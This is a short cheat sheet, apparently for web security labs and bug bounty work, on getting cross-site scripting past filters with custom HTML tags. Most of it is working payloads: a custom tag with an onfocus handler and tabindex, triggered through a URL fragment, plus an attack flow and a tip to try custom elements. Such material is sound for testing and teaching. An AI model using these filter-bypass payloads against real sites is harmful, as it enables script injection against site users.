# Custom Tag XSS CheatSheet

## Why Custom Tags?

Many filters only block:

```html
script
img
svg
iframe
```

but forget:

```html
<xss>
<test>
<custom>
```

---

# Basic Payload

```html
<xss onfocus=alert(1)>
```

---

# Focusable Payload

```html
<xss
id=x
tabindex=1
onfocus=alert(1)>
```

---

# Fragment Trigger

```text
#x
```

---

# Related Labs

```text
Lab12
Lab14
```

---

# Attack Flow

```text
Custom Tag
        ↓
Focusable
        ↓
Focus Event
        ↓
Execution
```

---

# Bug Bounty Reminder

Whenever filters block standard tags:

```text
Try Custom Elements
```